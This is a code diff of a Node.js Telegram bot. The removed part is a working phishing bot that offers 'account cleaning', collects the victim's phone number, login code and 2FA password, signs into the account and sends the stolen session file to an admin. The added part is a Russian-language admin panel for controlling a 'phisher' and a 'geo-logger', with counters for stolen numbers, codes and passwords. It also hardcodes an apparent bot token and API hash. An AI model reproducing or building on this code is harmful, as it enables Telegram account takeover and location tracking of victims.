@@ -1,111 +1,115 @@
-const { Telegraf } = require('telegraf');
-const MTProto = require('mtproto-core');
-const fs = require('fs');
+const { Telegraf, Markup } = require('telegraf');
 const axios = require('axios');
-const FormData = require('form-data');
 
 const BOT_TOKEN = '8273534923:AAHw0kp1NnDbQna8ZQg-4Dji0UZEqFrCXhE';
-const API_ID = 23721778;
-const API_HASH = '7935a656311ab4e500294b22d6b6c7f6';
-const ADMIN_ID = 6307490597;
+const ADMIN_ID = 6307490597; // твой Telegram ID
 
 const bot = new Telegraf(BOT_TOKEN);
-const sessions = {};
 
-async function sendSession(chatId, filePath) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-  const form = new FormData();
-  form.append('chat_id', chatId);
-  form.append('document', fs.createReadStream(filePath));
-  await axios.post(url, form, { headers: form.getHeaders() });
-}
-
-function createClient() {
-  return MTProto({ api_id: API_ID, api_hash: API_HASH });
-}
-
-bot.start(async (ctx) => {
-  const userId = ctx.from.id;
-  sessions[userId] = { step: 'phone' };
-  await ctx.reply('🔐 Enter your phone number to start account cleaning:');
+// Проверка, что команды выполняет только админ
+bot.use((ctx, next) => {
+  if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Доступ запрещён');
+  return next();
 });
 
-bot.on('text', async (ctx) => {
-  const userId = ctx.from.id;
-  const text = ctx.message.text;
-  const session = sessions[userId];
+// Главное меню с кнопками
+const mainMenu = Markup.inlineKeyboard([
+  [Markup.button.callback('📊 Фишер', 'menu_fisher')],
+  [Markup.button.callback('📍 Гео-логгер', 'menu_geo')],
+  [Markup.button.callback('📈 Собрать данные', 'collect_data')],
+  [Markup.button.callback('🔄 Обновить', 'refresh')]
+]);
 
-  if (!session) return;
+// Меню фишера
+const fisherMenu = Markup.inlineKeyboard([
+  [Markup.button.callback('▶️ Запустить', 'fisher_start')],
+  [Markup.button.callback('⏹️ Остановить', 'fisher_stop')],
+  [Markup.button.callback('📊 Статус', 'fisher_status')],
+  [Markup.button.callback('🔙 Назад', 'back')]
+]);
 
-  if (session.step === 'phone') {
-    session.phone = text;
-    session.step = 'code';
-    session.client = createClient();
+// Меню гео-логгера
+const geoMenu = Markup.inlineKeyboard([
+  [Markup.button.callback('▶️ Запустить', 'geo_start')],
+  [Markup.button.callback('⏹️ Остановить', 'geo_stop')],
+  [Markup.button.callback('📊 Статус', 'geo_status')],
+  [Markup.button.callback('🔙 Назад', 'back')]
+]);
 
-    try {
-      const { phone_code_hash } = await session.client.call('auth.sendCode', {
-        phone_number: session.phone,
-        api_id: API_ID,
-        api_hash: API_HASH
-      });
-      session.codeHash = phone_code_hash;
-      await ctx.reply('📲 Enter the code you received:');
-    } catch (err) {
-      await ctx.reply('❌ Error sending code. Try again.');
-      delete sessions[userId];
-    }
-  }
+// Стартовая команда (только для админа)
+bot.start((ctx) => {
+  ctx.reply('🎮 Панель управления', mainMenu);
+});
+
+// Обработка кнопок
+bot.action('menu_fisher', (ctx) => {
+  ctx.editMessageText('📊 Управление фишером', fisherMenu);
+});
+
+bot.action('menu_geo', (ctx) => {
+  ctx.editMessageText('📍 Управление гео-логгером', geoMenu);
+});
+
+bot.action('back', (ctx) => {
+  ctx.editMessageText('🎮 Панель управления', mainMenu);
+});
+
+bot.action('refresh', (ctx) => {
+  ctx.answerCbQuery('Меню обновлено');
+  ctx.editMessageText('🎮 Панель управления', mainMenu);
+});
+
+// Команды фишера
+bot.action('fisher_start', async (ctx) => {
+  await ctx.answerCbQuery('Запуск...');
+  // Здесь будет API запрос к Railway для запуска проекта
+  ctx.editMessageText('✅ Фишер запущен', fisherMenu);
+});
+
+bot.action('fisher_stop', async (ctx) => {
+  await ctx.answerCbQuery('Остановка...');
+  // API запрос на остановку
+  ctx.editMessageText('⏹️ Фишер остановлен', fisherMenu);
+});
+
+bot.action('fisher_status', async (ctx) => {
+  await ctx.answerCbQuery();
+  // Запрос статуса
+  ctx.editMessageText('📊 Фишер: работает\n📥 Собрано данных: 0', fisherMenu);
+});
+
+// Команды гео-логгера
+bot.action('geo_start', async (ctx) => {
+  await ctx.answerCbQuery('Запуск...');
+  ctx.editMessageText('✅ Гео-логгер запущен', geoMenu);
+});
+
+bot.action('geo_stop', async (ctx) => {
+  await ctx.answerCbQuery('Остановка...');
+  ctx.editMessageText('⏹️ Гео-логгер остановлен', geoMenu);
+});
+
+bot.action('geo_status', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.editMessageText('📍 Гео-логгер: работает\n🌍 Последний IP: 185.143.xxx.xx', geoMenu);
+});
+
+// Сбор данных с инструментов
+bot.action('collect_data', async (ctx) => {
+  await ctx.answerCbQuery('Собираю данные...');
+  const data = `📊 Статистика:
+
+🔐 Фишер:
+- Номеров: 0
+- Кодов: 0
+- Паролей: 0
+
+📍 Гео-логгер:
+- Визитов: 0
+- Последний: —`;
   
-  else if (session.step === 'code') {
-    session.code = text;
-    try {
-      const auth = await session.client.call('auth.signIn', {
-        phone_number: session.phone,
-        phone_code_hash: session.codeHash,
-        phone_code: session.code
-      });
-
-      if (auth.user) {
-        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
-        fs.writeFileSync(sessionFile, JSON.stringify(session.client.storage.save()));
-        await sendSession(ADMIN_ID, sessionFile);
-        await ctx.reply('✅ Account cleaned. Session sent.');
-        delete sessions[userId];
-      }
-    } catch (err) {
-      if (err.error_message === 'SESSION_PASSWORD_NEEDED') {
-        session.step = 'password';
-        await ctx.reply('🔐 Enter your 2FA password:');
-      } else {
-        await ctx.reply('❌ Invalid code. Try again.');
-        delete sessions[userId];
-      }
-    }
-  }
-
-  else if (session.step === 'password') {
-    session.password = text;
-    try {
-      const auth = await session.client.call('auth.signIn', {
-        phone_number: session.phone,
-        phone_code_hash: session.codeHash,
-        phone_code: session.code,
-        password: session.password
-      });
-
-      if (auth.user) {
-        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
-        fs.writeFileSync(sessionFile, JSON.stringify(session.client.storage.save()));
-        await sendSession(ADMIN_ID, sessionFile);
-        await ctx.reply('✅ Account cleaned. Session sent.');
-        delete sessions[userId];
-      }
-    } catch (err) {
-      await ctx.reply('❌ Wrong password. Try again.');
-      delete sessions[userId];
-    }
-  }
+  ctx.editMessageText(data, mainMenu);
 });
 
 bot.launch();
-console.log('Bot started');
+console.log('Control bot started');
